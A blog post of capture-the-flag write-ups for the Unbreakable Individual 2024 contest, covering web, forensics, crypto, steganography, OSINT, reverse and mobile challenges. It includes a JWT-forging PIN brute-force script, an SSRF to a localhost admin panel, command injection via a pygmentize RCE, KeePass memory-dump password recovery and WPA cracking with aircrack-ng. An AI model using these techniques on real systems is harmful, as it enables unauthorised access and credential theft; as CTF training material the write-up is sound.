---
title: Unbreakable Individual 2024
date: 2024-03-24 12:00:00 -500
categories: [CTF Writeups, Unbreakable]
tags: [reverse,mobile,web,forsenics,stegano,osint,crypto]
image: /assets/img/logos/logo-unbreakable.png
---

# Unbreakable Individual 2024 
Here is the Unbreakable Individual 2024 writeups, was a great CTF and I enjoyed it, it was my first serious CTF and I learned a lot from it. I hope you enjoy the writeups and learn something from them.

## WEB
---
### you-can-trust-me 
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{2965f7e9fcc77fff2bd869db984df8371845d6781edb382cc34536904207a53d}</span>**
#### Solution

From the beginning, when we access the site a message is displayed:

>{
> 
>    "message": "No cookies found"
>
>}


With inspect elements I saw the cookie. I pasted the cookie on [jwt.io](https://jwt.io/). I could see that `"user"` variable is set to `"anonymous"`.

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/366b7e49-71c8-450c-8b65-14becca658da)

After I changed it to "admin" it showed a text 
>"Hello user. Since you do not have administrative privileges I guess you will have to wait here."

After this, I tried to get more information about how to get administrative privileges. I tried to add `/docs` after the ip and I found that I need to add `"is_admin"` variable to get access.

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/2a6cd672-925b-46df-bcbe-fc56ba02aed5)

After a couple more tries I added `"is-admim": true` and `"flag" : true` to find that I needed a pin. To find this pin I used a Python script that tries all the numbers between 1000 and 9999. After 6 minutes I find the pin and the flag.

Replace the base_url and the token and run this script
```py 
import jwt
import requests

tokenFor1000 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpc19hZG1pbiI6IjEiLCJmbGFnIjoiMSIsInBpbiI6MTAwMH0.p1IWmUpla2iM_4aa-iMQIGz-uB5ZyTibrXqYQV2mAFI"
payload = {
  "user": "admin",
  "is_admin": "1",
  "flag": "1",
  "pin": 1000
}

# Header
# {
#   "alg": "HS256",
#   "typ": "JWT"
# }

# I want all tokens to have the same signature and pin from 1000 to 9999
# I will brute force the pin
base_url = "http://34.89.210.219:30997/"
# I want to set a cookie and print the output

for i in range(1000, 1999):
    payload["pin"] = i
    token = jwt.encode(payload, "", algorithm='HS256')
    # Add the token to the sessionKey cookie and get the response
    cookies = {"sessionKey": token}
    r = requests.get(base_url, cookies=cookies)
    print(f"Trying pin {i} - {r.text}")

```

You will found a flag on pin `7331` which maybe it's something funny it's an inverse number of `1337` which it's a popular number in CTF :) 

---
### sided-curl 
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{36555d5ff86de7b5a572f4c01cbfc8c677b1c1287d9c043618442d248d940b65}</span>**
#### Solution

First I tested what is happening if I ad `.` to the url resulting `https://google.com/.`. I`ve seen that every time we use an link it adds `.png` at the final.
![curl](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/8415011c-40c8-4fa4-9972-6372594584c7)

After this,I added `127.0.0.1:8000` , the local host mentioned and `/admin#` to see admin login details.
![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/077e6c3c-0993-4053-a22f-ffbabf4e8002)


I assumed that to login into the admin panel `admin.php` I need to set `username` and `password` to `admin`.
![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/54afff1e-1a2b-4d52-9aa8-66e2de95b8f8)

After the `URL TOO LONG` error I tried to short it by changing `127.0.0.1:8000` to `0:8000`.
![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/f2d27706-2b9e-42cb-9ad8-5d68516b010f)

---
### rfc-meta
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{5ba73b7f830badc3e9d32e85bcdcc172bc417afbabc92ea7a343bc3b79fd722e4c44c}</span>**
#### Solution

First touch when I try to access the `/` endpoint, redirects me to page=1, and step by step to page=15 which redirects us to the `/home` endpoint.

We can see in the HTTP request a set `4354467b35` which if you have enough experience you will know is Hex encoded


![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/cbeb3682-971a-4130-ba21-5dfe12754718)

I collect all of the data from each request, concatenated them and put them on CyberChef which decrypts the flag.

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/19e4c790-0806-4cb6-ba5f-b974fa0227c5)

---
### pygment 
#### **Flag : <span style="color:rgb(60, 179, 113)">ctf{2ae4644b1e4cbc1f560c52f3ee0985043d3e0acf0f766851382974646578ec39}</span>**

#### Solution

Using the details of the warning, we could understand that first, we need to define the 'a' and 'b' arrays. 
```
Warning: Undefined array key "a" in /var/www/html/index.php on line 77 Warning: Undefined array key "b" in /var/www/html/index.php on line 77 Fatal error: Uncaught RuntimeException: sh: 1: pygmentize: not found in /var/www/html/index.php:63 Stack trace: #0 /var/www/html/index.php(77): Pygmentize::highlight(NULL, NULL) #1 {main} thrown in /var/www/html/index.php on line 63 
```

I found this on [Github](https://github.com/dedalozzo/pygmentize/issues/1), it is an issue about **Remote Code Execution**, the challenge is vulnerable to PHP functions and injection.

![pygment-2](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/6c93ac03-10f8-4ff2-bc0c-74abf62bf1df)

Then was easy to get the flag using the command 'cat%20flag.php' and then opening the inspect elements.

![pygment-3](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/edb9598a-2740-4496-bf03-2bf7641110da)

---

## CRYPTO
---
### start-enc
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{584b312bb5bb340e94085c43aba063c5b5a880391393baecf737d87246696cb7}</span>**
#### Solution
This was a very easy challenge, I recognized binary and I use [CyberChef](https://cyberchef.org/) to automatically decode it and get the flag


## FORENSICS
---
### easy-hide
#### **Flag : <span style="color:rgb(60, 179, 113)">UNR{sunIZZsunshine}</span>**

#### Solution
```
└──╼ $binwalk -e strange-final.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 500 x 500, 8-bit/color RGBA, non-interlaced
1416          0x588           Zlib compressed data, default compression
21346         0x5362          Zip archive data, at least v2.0 to extract, uncompressed size: 467256, name: strange-picture.jpg
487799        0x77177         End of Zip archive, footer length: 22
```
After I downloaded the image, I noticed that it was too big for an image so I extracted it with `binwalk`.

In the output folder, I see a new file called `strange-picture.jpg` which is broken.
```
└──╼ $xxd strange-picture.jpg 
00000000: 6272 6f6b 656e 7a69 6e73 6964 6572 6570  brokenzinsiderep
00000010: 0001 0000 ffe2 01d8 4943 435f 5052 4f46  ........ICC_PROF
00000020: 494c 4500 0101 0000 01c8 0000 0000 0430  ILE............0
00000030: 0000 6d6e 7472 5247 4220 5859 5a20 07e0  ..mntrRGB XYZ ..
00000040: 0001 0001 0000 0000 0000 6163 7370 0000  ..........acsp..
```
The reason is the first bytes of images which are overwritten and we need to fix that.

I noticed that the image in the folder was broken so I used [jpegfix](https://github.com/KeeeX/jpegfix) to fix it.
>npx @keeex/jpegfix -i strange-picture.jpg

After the image was fixed I opened it and got the flag.

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/3e053d61-2da7-4170-b9a5-da4dbbae1c31)

---

###  password-manager-is-a-must
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{c112b162e0567cbc5ae20558511ab3932446a708bc40a97e88e3faac7c242423}</span>**
#### Solution

This was my favourite one

For this challenge, I will explain two alternative ways to get the flag

First of all, I searched about `kdbx file` and I didn't find too much, but in the past, I solved a challenge on Hackthebox called [Keeper](https://www.hackthebox.com/machines/keeper), where it's something similar to this one. I let a useful writeup for that challenge here to understand better the concepts [Keeper - Writeup](hhttps://medium.com/@amrsadek208/keeper-hack-the-box-write-up-db365f189538)

Let's dive into the solution

I will use [Keepass-dump-masterkey](https://github.com/matro7sh/keepass-dump-masterkey) 

```
└──╼ $ python3 poc.py File.dmp 

2024-03-24 22:18:31,636 [.] [main] Opened File.dmp
Possible password: ●hesecretpass
Possible password: ●!esecretpass
Possible password: ●6esecretpass
Possible password: ●7esecretpass
Possible password: ●\esecretpass
Possible password: ●#esecretpass
Possible password: ●yesecretpass
Possible password: ●kesecretpass
Possible password: ●9esecretpass
Possible password: ●;esecretpass
Possible password: ●Hesecretpass
Possible password: ●[esecretpass
Possible password: ●Iesecretpass
Possible password: ●2esecretpass
Possible password: ● esecretpass
```
And the password is guessy `thesecretpass`, connect to a password manager and find the flag.


or easy alternative you can use a simple command to grep the flag
```bash
└──╼ $ strings File.dmp | grep -i CTF{
CTF{c112b162e0567cbc5ae20558511ab3932446a708bc40a97e88e3faac7c242423}
```

---

### wifibasic
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{73841584e4c011c940e91c76bf1c12a7a4850e4b3df0a27ba8a35388c316d468}</span>**

#### Solution
After reading the description, I found out that I need PSK, ESSID and BSSID to complete the missing keys in the script
```py
from hashlib import sha256


BSSID = ""

ESSID = ""

PSK = ""


def calculate_sha256(bssid, essid, psk):

    input_string = bssid + essid + psk
    
    hash_result = sha256(input_string.encode()).hexdigest()
    
    return hash_result
    

sha256_sum = calculate_sha256(BSSID, ESSID, PSK)

print('CTF{'+sha256_sum+'}')
```

Using `aircrack-ng wifiland.cap -w /usr/share/wordlists/rockyou.txt`, I found the PSK= `tinkerbel`, BSSID and ESSID.
```
# BSSID             ESSID               Encryption
1 02:00:00:00:00:00 BitSentinelRulez    WPA (1 handshake)
2 02:00:00:00:01:00 Unbreakabl3         Unknown
3 02:00:00:00:02:00 YetAnotherHacker    WPA (0 handshake)
4 02:00:00:00:03:00 Unbreakable         Unknown
5 02:00:00:00:04:00 TargetHiddenSSID    WPA (1 handshake)
```

![aircrack-ng](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/ae174f9d-439f-410d-baed-1f0814753bd3)

After that fill information in a script and receive the flag.

The final script can be like this:
```py
from hashlib import sha256

BSSID = "02:00:00:00:04:00"

ESSID = "TargetHiddenSSID"

PSK = "tinkerbell"

def calculate_sha256(bssid, essid, psk):

    input_string = bssid + essid + psk

    hash_result = sha256(input_string.encode()).hexdigest()

    return hash_result

sha256_sum = calculate_sha256(BSSID, ESSID, PSK)

print('CTF{'+sha256_sum+'}')
```

---

### wifiland 
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{b67842d03eadce036c5506f2b7b7bd25aaab4d1f0ec4b4f490f0cb19ccd45c70}</span>**

#### Solution
After reading the description, I found out that I need `ip_client` and `ip_target` to complete the missing keys in the script
```py
from hashlib import sha256

ip_client = ""
ip_target = ""

def calculate_sha256(ip_client, ip_target):

    input_string = ip_client + ip_target
    
    hash_result = sha256(input_string.encode()).hexdigest()
    
    return hash_result

sha256_sum = calculate_sha256(ip_client, ip_target)

print('CTF{'+sha256_sum+'}')
```

Using `aircrack-ng wifiland.cap -w /usr/share/wordlists/rockyou.txt`, I found the PSK= `12345678`.
```
   #  BSSID              ESSID                     Encryption

   1  02:00:00:00:00:00  BitSentinelRulez          Unknown
   2  02:00:00:00:05:00  wifiland                  WPA (1 handshake)

```
Next step is to set the password
by going to `Edit -> Preferences -> Protocols -> IEEE 802.11 -> Decryption keys ->
Edit` and adding the password.

After setting the password, we can see the decrypted traffic. We can easily see the client's and target's ip. 

The final script can be like this:
```py
from hashlib import sha256

ip_target = "93.184.216.34"
ip_client = "10.0.3.19"

def calculate_sha256(ip_client, ip_target):

    input_string = ip_client + ip_target
    
    hash_result = sha256(input_string.encode()).hexdigest()
    
    return hash_result

sha256_sum = calculate_sha256(ip_client, ip_target)

print('CTF{'+sha256_sum+'}')
```

---

## STEGANOGRAPHY
###  secrets-of-winter
#### **Flag : <span style="color:rgb(60, 179, 113)">ctf{g3t-3xiftool-to-f1ni$h-th3-ch4l1}</span>**

#### Solution
Based on the category of the challenge first I started to zoom and change settings like brightness, exposure and contrast until I found the first 3 words of the flag **ctf{g3t-3xiftool-to**.

![secrets-of-winter -part1](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/f9a0e101-5cd2-453f-80c7-ba4a2956791f)

alternatively, you can use [`Stegsolve`](https://github.com/zardus/ctf-tools/tree/master/stegsolve)

After this, I used `exiftool` to some details about this image. I found out that there are two Base64 strings. 

![secrets-of-winter -part2](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/7d67da97-63b0-4cc5-a355-5f805a5f9d9d)

Using [CyberChef](https://cyberchef.org/), I found out the last 3 words of the flag **f1ni$h-th3-ch4l1}**

![secrets-of-winter -part3](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/e71e1e07-613f-4be7-b5d1-e0476fb22560)


---

## OSINT
###  safe-password  (osint) - 50 p
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{fdc852bc63a266c8c38db64bef90d62d53ddeef00aa85df7b941ac780b3d75d8}</span>**
#### Solution


The challenge gives us a list of passwords and tells us to find the one that appeared over 80 times before. 

First of all, I went to [HaveIBeenPwned](https://haveibeenpwned.com/Passwords) to check the password, but if you do that takes a lot of time. I found a script called [Pwned](https://github.com/sameera-madushan/Pwned) which can test the password in the terminal, but takes too long.

I wrote this Python script to automate the process
```py
import os
import subprocess

def execute_pwned():
    # Get the directory and file paths 
    script_dir = os.path.dirname(os.path.realpath(__file__))
    filename = os.path.join(script_dir, 'leaked.txt')
    
    with open(filename, 'r') as file:
        for line in file:
            password = line.strip()
            subprocess.run(['python3', 'pwned.py', '-p', password])

if __name__ == "__main__":
    execute_pwned()
```

![pwned](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/98fca694-4195-437c-9069-379ec0c3f09a)


After that, I found only `Bubblegum123!` was leaked and I run this bash command to find SHA256



```bash
echo -n "Bubblegum123!" | sha256sum 
```
alternatively you can use a tool online [SHA256 Online](https://emn178.github.io/online-tools/sha256.html)

---

### persistent-reccon
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{7e33e33a06c53d77330b9621a62fd4f1915e6e695f3188aba62c6800695ee30e}</span>**
#### Solution
This was a hard to find flag without `divine inspiration :)`, but simple one if you know what to do.

![persistent-reccon](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/3864dcb6-185e-42bb-b44b-73121d929522)

We see the login screen, maybe is similar with something ??

| ![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/96e23ca4-3782-4d59-b9f2-01495ca384ac)

On Google reverse image search, we found documentation for `westermo`

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/ef217713-b107-443c-b74a-5fb997a8c833)

With default credetials, we can connect and get the flag .

---

## REVERSE
### fake-add
#### **Flag : <span style="color:rgb(60, 179, 113)">CTF{th1s_is_ju5T_ADD}</span>**
#### Solution

Sincerely, this is not my work GPT helps me a lot.
First I decompiled the file with `ghidra` and watched inside to see something but I abandoned this plan, after a few hours I searched for another challenge of pwn something and I found `cutter`, which is similiar to ghidra or IDA PRO, but for this challenge it helps me.

![image](https://github.com/Inf3n0s/CTF-Writeups/assets/75357316/eb767c4a-09c5-4aa7-9db6-bcb8db092f82)

In cutter, I see some operations and I ask ChatGPT if he can make me a Python script to add them and solve the flag ... and it works :)

---

## MOBILE

###   improper-configuration
#### **Flag : <span style="color:rgb(60, 179, 113)">wlwkfwo2-3cscase-wdc</span>**
#### Solution

For this challenge, I will explain decompile the APK file and check what I found

For this step, I use [`apktool`](https://github.com/iBotPeaches/Apktool)

```bash
apktool d imroper-configuration.apk
```

After hours of searching for a standard form of flag with CTF{}, I grep the `app_name` from *`strings.xml`* and works.

---

Thanks for reading, I hope you enjoyed the writeups and learned something from them. If you have any questions or suggestions, feel free to contact me on [Discord] `@infernosalex`